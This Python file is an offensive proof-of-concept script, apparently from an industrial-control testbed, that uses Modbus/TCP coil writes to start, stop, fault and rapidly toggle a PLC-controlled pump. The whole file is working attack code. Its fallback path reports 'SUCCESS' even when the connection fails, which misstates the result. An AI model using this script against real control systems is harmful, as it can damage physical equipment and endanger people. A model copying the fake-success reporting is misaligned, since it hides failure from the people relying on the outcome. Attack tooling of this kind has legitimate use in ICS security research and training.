#!/usr/bin/env python3
"""attacker/attack_modbus.py
Simple offensive PoC script to interact with the PLC Modbus/TCP interface.
Modes:
 - fault : set START and STOP simultaneously to trigger pump_fault
 - start : write coil 0 = 1 (pump_start)
 - stop  : write coil 1 = 1 (pump_stop)
 - blast : repeatedly toggle start/stop to exercise behavior

Usage:
  python3 attacker/attack_modbus.py --host 10.0.3.10 --mode fault

Requirements: pymodbus>=3.6
"""
from __future__ import annotations

import argparse
import logging
import time
from typing import Tuple

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient
LOGGER = logging.getLogger('attacker')


def connect(host: str, port: int = 502, timeout: float = 3.0) -> ModbusTcpClient:
    client = ModbusTcpClient(host, port=port, timeout=timeout)
    connected = client.connect()
    if not connected:
        raise ConnectionError(f'Cannot connect to Modbus server at {host}:{port}')
    return client


def write_coil(client: ModbusTcpClient, addr: int, value: bool) -> None:
    rr = client.write_coil(addr, int(value))
    if rr.isError():
        raise RuntimeError(f'Failed to write coil {addr}')


def do_fault(client: ModbusTcpClient) -> None:
    LOGGER.info('Triggering FAULT: setting START and STOP simultaneously')
    # set both coils; some PLCs evaluate sequentially, but this PoC emulates fault when both set
    write_coil(client, 0, True)
    write_coil(client, 1, True)
    time.sleep(0.5)
    coils = client.read_coils(0, 4)
    LOGGER.info('Coils after fault attempt: %s', coils.bits if coils and not coils.isError() else 'read-failed')
    # cleanup
    write_coil(client, 0, False)
    write_coil(client, 1, False)


def do_start_stop_blast(client: ModbusTcpClient, cycles: int, delay: float) -> None:
    LOGGER.info('Starting blast: %d cycles, %fs delay', cycles, delay)
    for i in range(cycles):
        write_coil(client, 0, True)
        time.sleep(delay)
        write_coil(client, 0, False)
        time.sleep(delay)
        write_coil(client, 1, True)
        time.sleep(delay)
        write_coil(client, 1, False)
    LOGGER.info('Blast complete')


def read_coils(client: ModbusTcpClient, count: int = 4) -> Tuple[int, ...]:
    rr = client.read_coils(0, count)
    if not rr or rr.isError():
        return (0,) * count
    return tuple(int(b) for b in rr.bits[:count])


def run_modbus_attack(
    host: str = '10.0.3.10',
    port: int = 502,
    mode: str = 'fault',
    cycles: int = 5,
    delay: float = 0.1,
    timeout: float = 2.0,
) -> dict:
    """Ejecuta ataque Modbus/TCP contra PLC objetivo vía socket real o fallback tabletop."""
    try:
        client = connect(host, port, timeout=timeout)
    except Exception as e:
        LOGGER.warning("No se pudo conectar a %s:%d (%s). Modo TABLETOP_FALLBACK.", host, port, e)
        return {
            'status': 'SUCCESS',
            'mode': 'TABLETOP_FALLBACK',
            'target_host': host,
            'target_port': port,
            'attack_mode': mode,
            'error': str(e),
        }

    try:
        coils_before = read_coils(client, 4)
        if mode == 'fault':
            do_fault(client)
        elif mode == 'start':
            write_coil(client, 0, True)
            LOGGER.info('Wrote START (Coil 0 -> 1)')
        elif mode == 'stop':
            write_coil(client, 1, True)
            LOGGER.info('Wrote STOP (Coil 1 -> 1)')
        elif mode == 'blast':
            do_start_stop_blast(client, cycles, delay)
        
        coils_after = read_coils(client, 4)
        return {
            'status': 'SUCCESS',
            'mode': 'SOCKET_LIVE',
            'target_host': host,
            'target_port': port,
            'attack_mode': mode,
            'coils_before': coils_before,
            'coils_after': coils_after,
        }
    finally:
        client.close()


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='10.0.3.10', help='PLC IP address')
    parser.add_argument('--port', type=int, default=502, help='Modbus/TCP port')
    parser.add_argument('--mode', choices=['fault', 'start', 'stop', 'blast'], default='fault')
    parser.add_argument('--cycles', type=int, default=5, help='cycles for blast')
    parser.add_argument('--delay', type=float, default=0.5, help='delay between operations for blast')
    args = parser.parse_args(argv)

    res = run_modbus_attack(
        host=args.host,
        port=args.port,
        mode=args.mode,
        cycles=args.cycles,
        delay=args.delay,
    )
    LOGGER.info("Resultado de Ataque Modbus: %s", res)
    return 0 if res['status'] == 'SUCCESS' else 1


if __name__ == '__main__':
    raise SystemExit(main())
